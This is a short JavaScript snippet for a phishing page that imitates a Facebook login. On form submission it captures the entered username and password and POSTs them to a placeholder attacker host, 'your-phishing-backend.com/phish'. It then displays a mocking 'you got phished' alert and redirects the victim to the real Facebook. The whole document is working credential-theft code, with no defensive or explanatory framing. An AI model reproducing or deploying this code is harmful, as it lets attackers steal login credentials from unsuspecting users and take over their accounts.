document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();

  var username = document.querySelector('input[name="username"]').value;
  var password = document.querySelector('input[name="password"]').value;

  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'http://your-phishing-backend.com/phish', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.onreadystatechange = function() {
      if (xhr.readyState === 4) {
          alert('Login successful! Just kidding, you got phished! 😁');
          window.location.href = 'https://facebook.com'; // Redirect to real Facebook
      }
  };
  xhr.send('username=' + username + '&password=' + password);
});